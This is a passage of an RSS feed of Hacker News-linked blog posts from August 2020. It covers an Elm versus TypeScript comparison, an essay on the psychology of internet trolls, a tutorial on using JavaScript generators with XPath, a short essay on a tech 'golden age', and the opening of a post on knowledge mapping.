<div><pre><code>showNumber maybeNumber <span>=</span>
    <span>case</span> maybeNumber <span>of</span>
        <span>Just</span> number <span>-&gt;</span>
            <span>-- Great, we have the number so we can format it nicely!</span>
            formatNumberNicely number

        <span>Nothing</span> <span>-&gt;</span>
            <span>-- This is the fallback in case the number isn't there.</span>
            <span>-- The code wouldn't compile without this branch.</span>
            <span>"The conversion didn't work out"</span>


showNumber (<span>String</span><span>.</span>toFloat <span>"3.14159265"</span>) <span>--&gt;</span> <span>"3.14"</span>

showNumber (<span>String</span><span>.</span>toFloat <span>"3 stars"</span>) <span>--&gt;</span> <span>"The conversion didn't work out"</span></code></pre></div>
<p>So in any case, we will get a string out of the <code>showNumber</code> function. In practice the best place to handle missing information is usually on the Html view itself. Content is loading? Show a loading view. Request failed? Show a failure view.</p>
<h2 id="reliable-types-for-all-packages">Reliable types for all packages</h2>
<p>To me, the single most appealing feature of a statically typed language is that as a developer I can rely 100% on things like function names and argument types to be correct when the compiler says “Success”. If you’ve used TypeScript for a while, you have most likely come across packages that either don’t provide any TypeScript type information, and you need community-provided typings that are out of sync with the package itself, or worse, the package includes typings that are downright incorrect. I have sadly had this experience several times in the past year.</p>
<p>In Elm, the package manager knows the types. They are an intrinsic feature of all Elm packages and not something you can omit or get wrong – all types in the code must match the documentation for the package to be publishable. Speaking of, all Elm packages have to have documentation for every single function they expose, and semantic versioning is enforced by the compiler too. What’s super nice for the user is that all packages have their documentation in the same place (<a href="https://package.elm-lang.org/">package.elm-lang.org</a>) formatted the same way.</p>
<p>The package ecosystem in Elm is very different from npm. There are far fewer packages, and I feel on average they are incredibly well designed and documented. In general, you don’t need many dependencies at all for building a big project – the language core provides lodash-like utilities and such by default. Things like <a href="https://package.elm-lang.org/packages/NoRedInk/elm-sortable-table/latest/">sortable tables</a>, <a href="https://package.elm-lang.org/packages/abradley2/elm-datepicker/latest/">date pickers</a>, <a href="https://package.elm-lang.org/packages/terezka/line-charts/latest/">charts</a> and <a href="https://package.elm-lang.org/packages/gampleman/elm-visualization/latest/">visualizations</a> have one or two packages that almost everyone needing them uses. On the other hand, there are things that do not exist in Elm like Google Maps (though there are other map packages). For these, you can either <a href="https://dev.to/lukewestby/talk-when-and-how-to-use-web-components-with-elm-f85">wrap them in Web Components</a> or use ports, which allow you to freely but safely communicate with the JS land.</p>
<h2 id="compiler-helps-you-finish-new-features">Compiler helps you finish new features</h2>
<p>There are a good amount of places in the code base to go through when adding a new feature in Redux. You need to create the UI, event handler, action creator, action, and reducer branch. It’s a lot to remember! TypeScript does not help me remember what parts of the code I was supposed to touch – which makes total sense as you can use it for so many other things besides Redux apps.</p>
<p>In Elm, you can start with creating the UI part using a message name that doesn’t exist yet, and the compiler will then guide you through all of the rest. I know this sounds silly, so let me demonstrate. Starting with the classic counter example you get when you head to <a href="https://ellie-app.com/new">ellie-app.com/new</a>, let’s add a reset feature!</p>
<ol>
<li>Add a button to the UI (as line 38): <code>, button [ onClick Reset ] [ text "reset" ]</code>. <br>➤ Compile. The message will say “I cannot find a `Reset` constructor”</li>
<li>Realize you need the new message, add <code>| Reset</code> to the Msg type (as line 20). <br>➤ Compile. The message will say “This `case` does not have branches for all possibilities” and mention the missing Reset branch.</li>
<li>Recall you need to add the branch to the <code>update</code> (eg. as line 32): <code>Reset -&gt; initialModel</code>. <br>➤ Compile. The program will compile and have a new feature: <em>a fully working reset button</em> 🎉!</li>
</ol>
<h2 id="all-of-the-code-has-good-typings">All of the code has good typings</h2>
<p>A lovely feature in modern statically typed languages, like TypeScript, is type inference. This means the compiler can figure out the types in your code on its own. Unfortunately the compiler can get confused sometimes, like in the case of filtering specific types of things from an array.</p>
<div><pre><code>type MaybeMessage <span>=</span>
    <span>|</span> <span>{</span> <span>type</span><span>:</span> <span>'has-message'</span><span>,</span> <span>message</span><span>:</span> string <span>}</span>
    <span>|</span> <span>{</span> <span>type</span><span>:</span> <span>'no-message'</span> <span>}</span>

<span>const</span> myArray<span>:</span> MaybeMessage[] <span>=</span> [<span>/*...*/</span>]

myArray
    .<span>filter</span>(item <span>=&gt;</span> <span>item</span>.<span>type</span> <span>===</span> <span>'has-message'</span>)
    .<span>map</span>(item <span>=&gt;</span> <span>item</span>.<span>message</span>) 

<span>// ERROR: Property 'message' does not exist on type '{ type: "no-message"; }'</span></code></pre></div>
<p>The error can be resolved in a number of ways, such as casting to <code>any</code> or creating a type guard function, but it’s always a bit of an awkward feeling when you need to tell the compiler what is really going on.</p>
<p>This might sound weird but in my experience the type inference in Elm is flawless. I’ve written tens of thousands of lines of Elm and not once have I seen a case where the compiler didn’t know what the types really are. I have disagreed on many occasions of course, but the compiler has always had it right and not me. It does not matter if you’ve written type annotations or not, the type inference will work just as well without any hints. As a matter of fact, the compiler only uses your type annotations to check that your expectations and the actual types match up.</p>
<h2 id="validating-data-is-not-optional">Validating data is not optional</h2>
<p>One of the things I’ve come to love the most …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ohanhi.com/react-typescript-vs-elm.html">https://ohanhi.com/react-typescript-vs-elm.html</a></em></p>]]>
            </description>
            <link>https://ohanhi.com/react-typescript-vs-elm.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259811</guid>
            <pubDate>Mon, 24 Aug 2020 12:07:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why People Become Internet Trolls]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 21 (<a href="https://news.ycombinator.com/item?id=24259728">thread link</a>) | @Gedxx
<br/>
August 24, 2020 | https://dradambell.com/why-people-become-internet-trolls/ | <a href="https://web.archive.org/web/*/https://dradambell.com/why-people-become-internet-trolls/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="1c056633" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div>
<p><span>When I was 10 years old and first introduced to the miracle of the World Wide Web, chat rooms were by far my favorite thing. Talking to random people from all over the world about anything you want — what more could a bored kid ask for?</span></p>

<p><span>I’d spend hours in these chat rooms, asking my new friends how old they were, what they had for breakfast, and how much pocket money their parents gave them. I shared this experience with a friend who didn’t own a computer and had never used the internet.</span></p>

<p><span>He asked if he could have a go. “Sure!” I said, excited for him to experience the wonder of the internet. Without hesitation, he began typing the worst insults and swear words he could think of. Horrified I had awoken a dark and malevolent force, and fearing he had forever ruined my friendship with strawberry88, I shut down my computer and didn’t invite him to play on the internet again.</span></p>

<p><span>To this day, I remain baffled by this behavior. When faced with the endless possibility of the internet, my childhood friend’s first impulse was to verbally abuse strangers. This innocent 10-year-old had become a troll.</span></p>

<h4 id="02ff"><span>Wretched impulses</span></h4>

<p><span>John Oliver once described the internet as a “dark carnival of humanity’s most wretched impulses.” Was it these wretched impulses that had consumed my childhood friend?</span></p>

<p><span>The act of trolling is best described from where its name&nbsp;<a href="https://www.etymonline.com/word/troll" target="_blank" rel="noreferrer noopener">may have come from</a>&nbsp;— the form of fishing where a lure is dangled off a moving boat.</span></p>

<figure><span><img src="https://miro.medium.com/max/3200/0*f3HYZpvSGgrg1vHC" alt=""></span></figure>

<p><span>The troll casts his bait (the offensive comment) into the water of the internet. An unsuspecting fish (the targeted user) sees the bait and feels compelled to go for it (the defensive comment). Soon they are hooked and reeled in without mercy. But unlike trolling for fish, which delivers a clear and edible reward, the troll’s reward isn’t entirely clear.</span></p>

<p><span>Trolling is a hard concept to define because there are various methods of trolling and differing degrees of depravity. Some are abhorrent, like “suicide baiting,” where trolls encourage vulnerable users to kill themselves, or “RIP trolls” who vandalize Facebook memorial sites of the recently deceased. But others, like “griefers” who play online games in a manner that purposely disrupts other players, are more of a nuisance.</span></p>

<p><span>Who are these trolls, and what drives them?</span></p>

<h4 id="4d5f"><span>The dark tetrad</span></h4>

<p><span>Psychologists have found&nbsp;<a href="https://www.sciencedirect.com/science/article/abs/pii/S0191886914000324" target="_blank" rel="noreferrer noopener">a link between trollish behavior</a>&nbsp;and a set of personality traits called “the dark tetrad.”</span></p>

<figure><span><img src="https://miro.medium.com/max/2974/0*sAMy6kU4hSsBKYQy" alt=""></span></figure>

<p><span>The dark tetrad comprises:</span></p>

<ul>
<li><span>Sadism — deriving pleasure from another’s pain</span></li>
<li><span>Psychopathy — impairment of empathy and remorse</span></li>
<li><span>Machiavellianism — manipulative and emotionally “cold” behavior</span></li>
<li><span>Narcissism — self-involvement and a need for admiration</span></li>
</ul>

<p><span><a href="https://www.academia.edu/41115419/Loneliness_moderates_the_relationship_between_Dark_Tetrad_personality_traits_and_internet_trolling" target="_blank" rel="noreferrer noopener">In a recent study</a>, trolls were positively correlated with three of the four dark tetrad traits, with narcissism being the odd one out. They found trolls were manipulative, lacked empathy, and enjoyed hurting others. Men exhibited these traits more commonly than women and were more likely to troll. Loneliness was also a significant predictor of trolling when in the presence of Machiavellianism or psychopathy.</span></p>

<p><span>Most studies on trolls use internet surveys to collect data, which is questionable: Can we really trust trolls to complete surveys accurately? This method may also not account for those who don’t consider their behavior to be trollish or those unaware of their trollish behavior.</span></p>

<p><span>In the book&nbsp;<a href="https://www.hardiegrant.com/au/publishing/bookfinder/book/troll-hunting-by-ginger-gorman/9781743794357" target="_blank" rel="noreferrer noopener"><em>Troll Hunting</em></a>, journalist Ginger Gorman spends years building relationships with the worst trolls she can find in an attempt to understand what drives them. To her surprise, trolls were not uneducated lost souls who lacked social skills and lived in their mother’s basement. These trolls had partners, children, and full-time jobs. They showed leadership skills as commanders of&nbsp;<a href="https://www.theguardian.com/books/2019/jan/28/it-was-like-being-skinned-alive-ginger-gorman-goes-hunting-for-trolls" target="_blank" rel="noreferrer noopener">large trolling syndicates</a>. They were socially intelligent and able to pinpoint users’ weaknesses with vicious precision. But what was driving them?</span></p>

<p><span>Many saw trolling as a hobby — something that entertained or amused. Some were ideologically driven, attacking anybody opposing their belief system. But both types of troll tended to engage users that threatened their beliefs or sense of self.</span></p>

<p><span>Some of the trolls exhibited dark tetrad traits. In these trolls, she saw a common pattern — excessive internet use with little to no parental supervision between the ages of 11 and 16. But some trolls didn’t fit the dark tetrad personality type. These trolls were pleasant, friendly, and compassionate when she engaged them directly. How could these trolls behave so antisocially online yet appear to function as typical members of society offline?</span></p>

<h4 id="7160"><span>Empathy deficit</span></h4>

<p><span>The human brain was primarily designed for face-to-face interaction. It hasn’t had time to adapt to communication over the internet.</span></p>

<p><span>Nonverbal communication — facial expressions, gestures, and voice qualities — provides the precise social context of an interaction. While the claim that 93% of communication being nonverbal is&nbsp;<a href="https://cornerstone.lib.mnsu.edu/cgi/viewcontent.cgi?article=1000&amp;context=ctamj" target="_blank" rel="noreferrer noopener">inaccurate</a>, it is a crucial part of how we communicate. Words alone can only go so far. Even if we used the full&nbsp;<a href="https://englishlive.ef.com/blog/language-lab/many-words-english-language/" target="_blank" rel="noreferrer noopener">170,000 words</a>&nbsp;currently in use in the English language, we still couldn’t convey what an expressive face or a suggestive voice could.</span></p>

<p><span>Most internet discussions only allow words. Well, words and emojis and GIFs and stickers and all the other substitutes created to replace nonverbal cues.</span></p>

<p><span>If you say something mean to my face and make me cry, you will probably start to feel uncomfortable. Unless you’re especially mean or psychopathic, my distress will trigger an empathic response and lead you to have mercy. If you tweet something mean and make me cry, no amount of emojis can convey what the sight of a grown man weeping can. If there is no social cue to elicit an empathic response, you might continue your tirade of meanness.</span></p>

<p><span>The absence of nonverbal feedback leads to an “empathy deficit,” and this is what sociopaths suffer from.</span></p>

<h4 id="53a2"><span>Toxic disinhibition</span></h4>

<p><span>When you combine an empathy deficit with the anonymity of online interactions, you get “<a href="https://en.wikipedia.org/wiki/Online_disinhibition_effect" target="_blank" rel="noreferrer noopener">toxic disinhibition</a>,” which is more than just the phenomenon of being rude to bar staff after that fifth shot of tequila.</span></p>

<p><span>Anonymity can lead to “<a href="https://en.wikipedia.org/wiki/Deindividuation" target="_blank" rel="noreferrer noopener">deindividuation</a>” — a temporary loss of one’s identity leading to behavior incongruent with one’s character. It explains why groups of civilized people can engage in riots. It also explains trolling. If a lack of nonverbal cues is what makes us detached from the other person’s suffering, deindividuation is what makes us detached from the awareness of our misconduct.</span></p>

<p><span>True anonymity offers protection from real-world social repercussions, and this has profound effects on human behavior. The image-based bulletin board 4chan, where registration isn’t possible and users remain anonymous, has been&nbsp;<a href="https://theconversation.com/4chan-raids-how-one-dark-corner-of-the-internet-is-spreading-its-shadows-68394" target="_blank" rel="noreferrer noopener">infamous as a troll incubator</a>&nbsp;for this reason. When there are no real-world consequences to your actions, it liberates you from a lifetime of societally inhibited behaviors. Society discourages antisocial behavior and encourages prosocial behavior, so it is antisocial behavior that seeks liberation.</span></p>

<p><span>We are a delicate balance between prosocial humans and antisocial primates. When society cannot enforce prosocial human behavior, the antisocial primate may come back into power. And thus the troll is created.</span></p>

<h4 id="f597"><span>Troll begets troll</span></h4>

<p><span>Researchers at Stanford and Cornell universities performed a large-scale data analysis on&nbsp;<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5791909/" target="_blank" rel="noreferrer noopener">over 16 million comments</a>&nbsp;from December 2012 to August 2013 on CNN.com and found 1 in 4 posts flagged as abusive were from users with no prior record of trollish behavior. This suggests trolling isn’t always a full-time occupation and that one may indulge sporadically.</span></p>

<p><span>The researchers could predict the likelihood of trolling based on the nature of other comments in the discussion and the user’s mood. If earlier comments were negative, the propensity to troll was greater. Like a bad mood, trolling is contagious. All it takes is another user’s trollish comment and a bad mood to create an environment in which our inner troll can blossom.</span></p>

<h4 id="b294"><span>The inner troll</span></h4>

<p><span>It is easier to view trolls as bad apples than see them as something inside all of us, waiting for the right environment to let loose. But when we condemn trolls as inherently malicious individuals, we limit our understanding of what may drive these behaviors.</span></p>

<p><span>While RIP trolls or suicide baiters are likely to be dark tetrad personality types who use the internet as an outlet to indulge their darkest impulses, lesser trolls may be part-time participants who will engage with the right combination of a bad day and a noxious environment. We have only begun to scratch the surface in our understanding of trolls, but the evidence we have suggests we may all be vulnerable.</span></p>

<p><span>Is anyone exempt from toxic disinhibition? Few respond to a tweet that offends them with “Excuse me, I really don’t want to be rude, but if I may could I please respectfully disagree with your opinion for these reasons …” While an offhand remark may appear harmless, the less empathic our online interactions collectively become, the greater risk we all stand of becoming trolls. The gentle ripples of impolite tweets may become crashing toxic waves of disinhibited hatred.</span></p>

<p><span>Trolling isn’t black and white, it is somewhere in the grey between prosocial human and antisocial primate. Ultimately, our propensity for antisocial behavior in the physical world is likely to predict similar online behavior.</span></p>

<h4 id="9272"><span>How can we manage our inner trolls?</span></h4>

<p><span>The more accountable we are for our behavior, the less potential we have of becoming trolls. Employing&nbsp;<a href="https://scholarspace.manoa.hawaii.edu/bitstream/10125/41373/1/paper0224.pdf" target="_blank" rel="noreferrer noopener">less anonymity may help</a>, but this raises privacy concerns for many. Anonymity can also be a good thing. Benign disinhibition — the friendly sibling of toxic disinhibition — is where users freely discuss their deepest insecurities and concerns with other users. This can be very therapeutic and shouldn’t be discouraged. But by using anonymity only where it is necessary, we reduce the likelihood of toxic disinhibition.</span></p>

<p><span>Empathy doesn’t come …</span></p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dradambell.com/why-people-become-internet-trolls/">https://dradambell.com/why-people-become-internet-trolls/</a></em></p>]]>
            </description>
            <link>https://dradambell.com/why-people-become-internet-trolls/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259728</guid>
            <pubDate>Mon, 24 Aug 2020 11:50:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[JavaScript Generators, Meet XPath]]>
            </title>
            <description>
<![CDATA[
Score 101 | Comments 20 (<a href="https://news.ycombinator.com/item?id=24259688">thread link</a>) | @fanf2
<br/>
August 24, 2020 | https://jack.wrenn.fyi/blog/xpath-for-2020/ | <a href="https://web.archive.org/web/*/https://jack.wrenn.fyi/blog/xpath-for-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          
<article>
    <header>
      
      <span>2020-08-22&nbsp;</span>
    </header>

    <p>Using Generators to Modernize a Geriatric Javascript API for <code>$CURRENT_YEAR</code></p>
<span id="continue-reading"></span>
<hr>
<p>How do you find-and-replace text on an HTML page?</p>
<pre><code><span>&lt;div&gt;</span><span>Hello, </span><span>&lt;span&gt;</span><span>human</span><span>&lt;/span&gt;</span><span>!</span><span>&lt;/div&gt;
</span></code></pre>
<p>If the text is neatly neatly isolated inside an HTML element, it's easy; this will do:</p>
<pre><code><span>document</span><span>.</span><span>querySelector</span><span>(</span><span>"span"</span><span>)</span><span>.textContent </span><span>= </span><span>"evolved ape"</span><span>;
</span></code></pre>
<p><strong>But here's a puzzle</strong>: how do you you change text that <em>isn't</em> neatly isolated in an HTML element?</p>
<p>You <em>could</em> use <code>innerHTML</code>:</p>
<pre><code><span>let </span><span>elt </span><span>= </span><span>document</span><span>.</span><span>querySelector</span><span>(</span><span>"div"</span><span>)</span><span>;
</span><span>elt</span><span>.innerHTML </span><span>= </span><span>elt</span><span>.innerHTML.</span><span>replace</span><span>(</span><span>"Hello"</span><span>, </span><span>"Greetings"</span><span>)</span><span>;
</span></code></pre>
<p>...but this will hose any event listeners registered on <code>elt</code>'s children.</p>
<p>You <em>could</em> grapple onto the nearest selectable element:</p>
<pre><code><span>let </span><span>node </span><span>= </span><span>document</span><span>.</span><span>querySelector</span><span>(</span><span>"div"</span><span>)</span><span>.childNodes[</span><span>0</span><span>];
</span><span>node</span><span>.textContent </span><span>= </span><span>node</span><span>.textContent.</span><span>replace</span><span>(</span><span>"Hello"</span><span>, </span><span>"Greetings"</span><span>)</span><span>;
</span></code></pre>
<p>Yuck; this sort of child-node indexing feels <em>really</em> brittle.</p>
<p><strong>Why can't we just <em>directly</em> select the text nodes containing <code>Hello</code>?</strong></p>
<h2 id="xpath">XPath</h2>
<p><strong>We can!</strong> Enter: <a href="https://en.wikipedia.org/wiki/XPath">XPath</a>, the <em>excessively</em> powerful language for querying XML documents. It's usable in web-browsers with the, uh, <em>descriptively</em>-named method <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/evaluate"><code>document.evaluate</code></a>.</p>
<p>It's a <em>bit</em> of a production to use:</p>
<pre><code><span>let </span><span>xpath </span><span>= </span><span>"//text()[contains(., 'Hello')]"</span><span>; </span><span>// find text nodes containing 'Hello'
</span><span>let </span><span>context </span><span>= </span><span>document</span><span>.body; </span><span>// look in the body element
</span><span>let </span><span>namespace_resolver </span><span>= </span><span>null</span><span>; </span><span>// some sorta xml voodoo
</span><span>let </span><span>result_type </span><span>= </span><span>XPathResult</span><span>.ORDERED_NODE_SNAPSHOT_TYPE; </span><span>// DEFINITELY MAKE SURE YOU USE THIS

</span><span>let </span><span>results </span><span>= </span><span>document</span><span>.</span><span>evaluate</span><span>(</span><span>xpath</span><span>, </span><span>context</span><span>, </span><span>null</span><span>, </span><span>result_type</span><span>)</span><span>;

</span><span>for </span><span>(</span><span>let </span><span>i </span><span>= </span><span>0</span><span>; </span><span>i </span><span>&lt; </span><span>results</span><span>.snapshotLength; </span><span>i</span><span>++</span><span>) {
  </span><span>let </span><span>node </span><span>= </span><span>results</span><span>.</span><span>snapshotItem</span><span>(</span><span>i</span><span>)</span><span>;
  </span><span>node</span><span>.textContent </span><span>= </span><span>node</span><span>.textContent.</span><span>replace</span><span>(</span><span>"Hello"</span><span>, </span><span>"Greetings"</span><span>)</span><span>;
}
</span></code></pre>
<p>Yes, you really need to write <em>all</em> of that. The <code>result_type</code> argument is technically optional, but omit it at your own peril: without it, you must instead stream results via <code>iterateNext</code>, and this will crash with an exception if you dare <em>modify</em> the queried elements!</p>
<p>It's no wonder <code>document.evaluate</code> is seldom used. <strong>Can we improve on it?</strong></p>
<h2 id="iterizing-xpath-queries">Iterizing XPath Queries</h2>
<p>Yes, with <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Iterators_and_Generators"><strong>generators</strong></a>! We can exploit the implicit iterability of generators to modernize this unwieldy API:</p>
<pre><code><span>Document</span><span>.</span><span>prototype</span><span>.xpath </span><span>= </span><span>Element</span><span>.</span><span>prototype</span><span>.</span><span>xpath </span><span>=
  </span><span>function* </span><span>xpath</span><span>(</span><span>xpath</span><span>) {
    </span><span>let </span><span>context </span><span>= </span><span>this </span><span>instanceof </span><span>Document </span><span>? </span><span>document</span><span>.documentElement </span><span>: </span><span>this</span><span>;
    </span><span>let </span><span>namespace_resolver </span><span>= </span><span>null</span><span>;
    </span><span>let </span><span>result_type </span><span>= </span><span>XPathResult</span><span>.ORDERED_NODE_SNAPSHOT_TYPE;
    </span><span>let </span><span>results </span><span>= </span><span>document</span><span>.</span><span>evaluate</span><span>(</span><span>xpath</span><span>, </span><span>context</span><span>, </span><span>null</span><span>, </span><span>result_type</span><span>)</span><span>;

    </span><span>for </span><span>(</span><span>let </span><span>i </span><span>= </span><span>0</span><span>; </span><span>i </span><span>&lt; </span><span>results</span><span>.snapshotLength; </span><span>i</span><span>++</span><span>)
      </span><span>yield </span><span>results</span><span>.</span><span>snapshotItem</span><span>(</span><span>i</span><span>)</span><span>;
  };
</span></code></pre>
<p>And because the result of this function is iterable, we can use it with <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax">spread syntax</a>:</p>
<pre><code><span>[</span><span>...</span><span>document</span><span>.</span><span>xpath</span><span>(</span><span>"//text()[contains(., 'Hello')]"</span><span>)</span><span>].
  </span><span>forEach</span><span>(</span><span>node </span><span>=&gt; </span><span>node</span><span>.textContent </span><span>= </span><span>node</span><span>.textContent.</span><span>replace</span><span>(</span><span>"Hello"</span><span>, </span><span>"Greetings"</span><span>))</span><span>;
</span></code></pre>
</article>

        </div></div>]]>
            </description>
            <link>https://jack.wrenn.fyi/blog/xpath-for-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259688</guid>
            <pubDate>Mon, 24 Aug 2020 11:43:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Golden Age]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24259618">thread link</a>) | @_squared_
<br/>
August 24, 2020 | https://gaby.dev/posts/golden-age | <a href="https://web.archive.org/web/*/https://gaby.dev/posts/golden-age">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			
			<h4>Published Sun Aug 23 2020</h4>
			<hr>
			<blockquote>
<p>He settled the black terry sweat-band across his forehead, careful not to disturb the flat Sendai dermatrodes.<br>He closed his eyes.<br>A gray disk, the color of Chiba sky.<br>Disk beginning to rotate, faster, becoming a sphere of paler gray. Expanding –<br>And flowed, flowered for him, fluid neon origami trick, the unfolding of his distanceless home, his country, transparent 3D chessboard extending to infinity. Inner eye opening to the stepped scarlet pyramid of the Eastern Seaboard Fission Authority burning beyond the green cubes of the Mitsubishi Bank of America, and high and very far away he saw the spiral arms of military systems, forever beyond his reach.<br>And somewhere he was laughing, in a white-painted loft, distant fingers caressing the deck, tears of release streaking his face.</p>
<p>– William Gibson, <em>Neuromancer</em> (edited)</p>
</blockquote>
<p>I believe when times are tough we should take a moment to take a breath and marvel at the world around us. A flower blossoming towards the sky, a rose-tinted cloud at dawn, a painter's thoughtful stroke on a canvas.<br>And while I cultivate many passions, I often marvel at technology - because oh my, there is so much to marvel at!</p>
<p>It would be an understatement to say that a lot has happened since humankind cobbled together a bunch of silicium and electrocuted it into <em>thinking</em>, of all things. And while we have not quite reached Gibson's vision of cyberspace, I'd argue that we are, more likely than not, in a tech "golden age".</p>
<p>This might come as a surprise to you. After all, we're starting to see <a href="https://www.nature.com/news/the-chips-are-down-for-moore-s-law-1.19338">the end of Moore's law</a>, a <a href="https://en.wikipedia.org/wiki/Big_Tech">few tech giants</a> have leveraged consumers' laziness to build an advertising market bubble that rules the world's economy, and a rising superpower's "<a href="https://en.wikipedia.org/wiki/Cyberspace_Administration_of_China">Cyberspace Administration</a>" managed to deny 1.8 billion people <a href="https://en.wikipedia.org/wiki/Great_Firewall">free, uncensored access to information</a>.</p>
<p>And still, especially for hackers, makers, post-dotcom entrepreneurs and other digital-age freaks, now more than ever is the time to get excited.</p>
<p>The COVID-19 pandemic has catapulted what was left of the old world into digitalization. Millions of apes wired to one another waited long months in their home for their screens to blink and tell them "lockdown's over". No 1984 science-fiction writer could have imagined such an alien scenario, nor its consequences.</p>
<p>As hordes of white-collar workers download videoconferencing software, unknowingly settling down in cyberspace for an ever-expanding portion of their lives, the curious among them will start to notice this is a land of opportunities.</p>
<p>Here, most resources can be leased dirt cheap and in unimaginable quantities - data storage, bandwidth, computing power. A common form of business are <a href="https://en.wikipedia.org/wiki/Software_as_a_service">SaaS</a> products, leased access to computer programs that, if made correctly, can accommodate a virtually unlimited number of tenants, effectively printing cash.</p>
<p>While we haven't figured out <a href="https://en.wikipedia.org/wiki/Brain%E2%80%93computer_interface">dermatrodes</a> yet, you can dive in on a wide range of devices, and soon from pretty much anywhere on <a href="https://en.wikipedia.org/wiki/Starlink">this planet</a>, and perhaps <a href="https://en.wikipedia.org/wiki/Interplanetary_Internet">the next one</a>, too. Oh, you're also joining a growing population of <a href="https://internetworldstats.com/stats.htm">4.8 billion</a> humans - other inhabitants include <a href="https://en.wikipedia.org/wiki/Internet_of_things">connected IoT devices</a>, <a href="https://en.wikipedia.org/wiki/Web_crawler">crawlers</a> and other cyber automatons, and the occasional <a href="https://en.wikipedia.org/wiki/Artificial_neural_network">neural network</a>, which might have a <a href="https://liamp.substack.com/p/my-gpt-3-blog-got-26-thousand-visitors">blog</a> - in fact, you can't really <em>know</em> for sure that this very piece you're reading hasn't been written by one.</p>
<p>So go ahead, explore, learn, build something. Whatever it is you're thinking of, you can probably learn about, build, ship, and scale it on the Internet. Your paychecks live there too, as will your food orders, entertainment, relationships...</p>
<p>Meatspace is becoming more irrelevant each and every day.<br>Now is your time to punch deck and get yourself a place in cyberspace.</p>
<p>Welcome to the Golden Age.</p>

		</article></div>]]>
            </description>
            <link>https://gaby.dev/posts/golden-age</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259618</guid>
            <pubDate>Mon, 24 Aug 2020 11:29:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Knowledge Mapping]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24259529">thread link</a>) | @todsacerdoti
<br/>
August 24, 2020 | https://zorbash.com/post/knowledge-mapping/ | <a href="https://web.archive.org/web/*/https://zorbash.com/post/knowledge-mapping/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    <p><img alt="😮 You looked at the source!" src="https://zorbash.com/images/zorbash_glitched.gif"></p>
    <h2>Code spells, smells and sourcery</h2>
  </div>

  
</div><div role="main">
  <article>
    
    <section>
      <p><em>What do <strong>I</strong> know? What do <strong>we</strong> know?</em></p>
<p><em>How do we know what we know and what is there that we should know?</em></p>
<p>Video games like Age of Empires, Civilisation and others have the concept of technology trees.</p>
<img src="https://zorbash.com/images/posts/knowledge_map/aoe.jpg">
<p>I study a lot, where should I spend my time? What should I read next? Is my knowledge broad enough?
I’ve used Goodreads quite extensively, it’s great to discover new books to read, mark your progress,
make friends and such.</p>
<p>Nowadays there’s so much information readily available, but not that many tools to help you
organise and allocate your “research points”.</p>
<h2 id="learning-together">Learning Together</h2>
<p>The recent COVID-19 pandemic surfaced the shortcomings of humanity to work together
to solve fundamental healthcare issues.
Some “experts” rushed to call it a black swan, despite it clearly not being one (<a href="https://www.newyorker.com/news/daily-comment/the-pandemic-isnt-a-black-swan-but-a-portent-of-a-more-fragile-global-system">read more</a>).</p>
<p>Thousands of Americans are victims of the opioid crisis and countless ones
are shoveling their money in the wild-west of unregulated fintech companies
with mottos like “anyone can be a trader” or in cryptocurrencies 🙃.</p>
<p>The media promote optimising for the short-term, making us think we’re the last generation to walk the planet.
Our countries are involved in wars, we fund wars with our taxes, yet the disasters
that war brings always seem so remote.</p>
<p>How do we respond? We <strong>educate</strong> ourselves, we <strong>talk</strong>, we <strong>act</strong>. A university degree or a code
bootcamp might help you land a job, but securing your freedom of thought is a never-ending struggle.</p>
<h2 id="learning-to-learn">Learning to Learn</h2>
<p>Be more systematic, build your knowledge map and start exploring branch
by branch.
You don’t need a degree as a reward, nor any imaginary internet points.
The real reward is that you’ll be able to better understand the natural world and society.
Think of <a href="https://twitter.com/hashtag/BlackLivesMatter">#BlackLivesMatter</a> how much do you know about it? Do you want to be the person who forms
an opinion based on a couple of tweets or headlines?
Create a list of books, films, articles to go through and keep track of your progress.</p>
<blockquote>
<p>Reading, has this incredible effect that it minimises your chances of becoming a racist,
an anti-vaxxer, a climate-change denier or a flat earther. Quite a reward ain’t it?</p>
</blockquote>
<h2 id="universities">Universities</h2>
<p>Universities play the role of gatekeepers of knowledge and the perpetuation of class segregation.
Your studies have a certain duration and you get a degree. While such a concept is valuable to maintain
the status quo and keep the economy going it doesn't really seem to be about knowledge.
Learning is a continuous process and universities should not extinguish your passion for knowledge in exchange for a degree.
For me, receiving my degree wasn't something to celebrate. It was rather a warrant to stay away from the
supposed mecca of learning.</p>
<img src="https://zorbash.com/images/posts/knowledge_map/university.jpg">
<p>Fortunately in the digital age there are plenty of choices when it comes to expanding your knowledge.
<a href="https://www.khanacademy.org/">Khanacademy</a>, <a href="https://www.coursera.org/">Coursera</a>, <a href="https://www.udacity.com/">Udacity</a> to name a few.
Most of them seem heavily leaning towards STEM studies though. Where do we learn about the world?</p>
<p>First things first, by “the world” I mean outside the tech bubble.</p>
<blockquote>
<p>Yes, I can fix your computer, but how do I fix racism, how do I get to know my body, improve my health,
manage my personal finances and understand democracy and political science, so to meaningfully
participate in the commons?</p>
